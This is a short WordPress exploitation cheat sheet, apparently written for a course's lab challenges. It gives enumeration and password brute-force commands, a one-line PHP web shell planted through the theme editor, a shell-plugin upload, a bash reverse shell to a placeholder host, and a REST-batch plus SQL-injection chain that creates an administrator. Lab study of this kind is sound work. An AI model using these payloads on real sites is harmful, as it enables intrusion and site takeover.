# WordPress

Workflow: **enumerate → version/plugins → CVE → get admin (or direct RCE) → code execution → flag**.
"Flag outside the web root" ⇒ you need **RCE / file read**, not just DB access.

## 1. Enumerate
```bash
curl -s $T | grep -oE 'content="WordPress [0-9.]+"|ver=[0-9.]+' | sort -u    # core version
curl -s $T/readme.html | grep -i version ; curl -s $T/feed/ | grep generator
curl -s "$T/?rest_route=/wp/v2/users" | python -m json.tool                     # usernames
curl -s "$T/?author=1" -I | grep -i location                                    # /author/<name>/
wpscan --url $T -e vp,vt,u --plugins-detection mixed [--api-token TOKEN]        # tools/wpscan.md
```
Interesting: `/wp-login.php`, `/xmlrpc.php` (password brute via `system.multicall`),
`/wp-json/`, `/wp-content/uploads/` (listing?), `/wp-content/debug.log`, `wp-config.php.bak`.

## 2. Find the vuln
- Core version → [06-cve-research](../00-start/06-cve-research.md) (`searchsploit wordpress <ver>`,
  wpscan vuln DB, GitHub PoCs).
- Each plugin + version → same (most real WP bugs are in plugins).
- Weak admin password → `wpscan --url $T -U admin -P wordlists/passwords/top-1000.txt`.

## 3. Admin → code execution
Once you have an administrator account:
- **Plugin upload** (most reliable): `python scripts/web/wp_plugin_shell.py` builds `shell-plugin.zip`
  → Plugins → Add New → Upload → Activate →
  `GET /wp-content/plugins/shell-plugin/shell-plugin.php?k=aev&c=id`.
- **Theme editor**: Appearance → Theme File Editor → `404.php` → add `<?php system($_GET['c']); ?>`
  → `GET /wp-content/themes/<theme>/404.php?c=id` (disabled if `DISALLOW_FILE_EDIT`).
- Metasploit: `exploit/unix/webapp/wp_admin_shell_upload`.
- Reverse shell: `?c=bash -c 'bash -i >& /dev/tcp/YOU/443 0>&1'` → [reverse-shells](../11-post-exploitation/reverse-shells.md).
Then: `cat /etc/lab_flag` or [find-the-flag](../11-post-exploitation/find-the-flag.md).

## Course challenge (`wordpress`, core 6.9.4)
Unauthenticated chain "wp2shell": **CVE-2026-63030** (REST `/batch/v1` route confusion — a
double-nested batch makes a nested `requests` body run as top-level batch entries) +
**CVE-2026-60137** (`author_exclude` → `WP_Query author__not_in` unsanitised → UNION/time SQLi).
SQLi forges `wp_posts` rows (oEmbed cache + `customize_changeset`) so a `POST /wp/v2/users` runs as
the real admin → new administrator → plugin upload → `passthru()` → `cat /etc/lab_flag`.
Vulnerable: 6.8.x < 6.8.6, 6.9.x < 6.9.5, 7.0.x < 7.0.2.
```bash
python scripts/web/wordpress_wp2shell.py http://wordpress.chal.deti:8084 "cat /etc/lab_flag"
```
